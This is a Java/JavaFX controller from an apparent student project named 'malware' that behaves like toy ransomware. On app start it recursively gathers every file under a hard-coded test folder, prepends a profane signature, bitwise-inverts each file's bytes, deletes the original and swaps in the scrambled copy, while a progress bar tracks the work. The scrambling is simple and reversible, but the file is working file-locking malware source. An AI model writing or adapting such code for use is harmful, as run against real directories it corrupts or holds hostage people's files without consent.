package lk.ijse.dep10.malware.controller;

import javafx.concurrent.Task;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.fxml.FXMLLoader;
import javafx.scene.Scene;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.PasswordField;
import javafx.scene.control.ProgressBar;
import javafx.scene.layout.AnchorPane;
import javafx.stage.Stage;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;

public class SplashSceneController {

    @FXML
    private ProgressBar prg;



    @FXML

    private ArrayList<File> arrayListFiles = new ArrayList<>();
    private final String SIGNATURE = "You are fucked up";


    public void initialize() throws IOException {

        File targetDirectory = new File("/home/sagara/Desktop/test_malware");
        findFiles(targetDirectory);
        encryptFiles();

    }

    private void encryptFiles() throws IOException {
        Task task=new Task() {
            @Override
            protected Object call() throws Exception {
                int k=0;
                int size = arrayListFiles.size();
                for (File file : arrayListFiles) {
                    if(isEncrypted(file)){
                        --size;
                        continue;
                    }
                    FileInputStream fis = new FileInputStream(file);
                    File tempFile = File.createTempFile("-app", "ok");
                    FileOutputStream fos = new FileOutputStream(tempFile);


                    fos.write(SIGNATURE.getBytes());

                    fileOperation(file, fis, tempFile, fos);
                    updateProgress(++k, size);
                    fis.close();
                    fos.close();

                }

                return null;
            }
        };
        new Thread(task).start();

        prg.progressProperty().bind(task.progressProperty());

        task.setOnSucceeded(workerStateEvent -> {

            try {
                prg.getScene().getWindow().hide();
                FXMLLoader fxmlLoader = new FXMLLoader(this.
                        getClass().getResource("/view/MainScene.fxml"));
                AnchorPane root = fxmlLoader.load();
                MainSceneController ctrl = fxmlLoader.getController();
                ctrl.initData(this.arrayListFiles);
                Stage stage = new Stage();

                stage.setScene(new Scene(root));
                stage.sizeToScene();
                stage.setResizable(false);

                stage.show();
                stage.centerOnScreen();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        });





    }

    private void fileOperation(File file, FileInputStream fis, File tempFile, FileOutputStream fos) throws IOException {
        while (true) {
            byte[] buffer = new byte[1024];
            int read = fis.read(buffer);
            if(read==-1)break;
            for (int i = 0; i < read; i++) {
                buffer[i] = (byte) ~buffer[i];
            }
            fos.write(buffer, 0, read);
        }
        file.delete();
        tempFile.renameTo(file);
    }

    private void findFiles(File selectFile) {
        File[] files = selectFile.listFiles();
        for (File file : files) {
            if(file.isDirectory()) {
                findFiles(file);
                continue;
            }
            System.out.println(file);
            this.arrayListFiles.add(file);
        }
    }

    private boolean isEncrypted(File file) throws IOException {
        byte[] firstBytes = new byte[17];
        byte[] signatureByte = SIGNATURE.getBytes();

        FileInputStream fis = new FileInputStream(file);
        fis.read(firstBytes);

        for (int i = 0; i < 17; i++) {
            if (signatureByte[i] != firstBytes[i]) {

                return false;
            }
        }

        return true;
    }




}





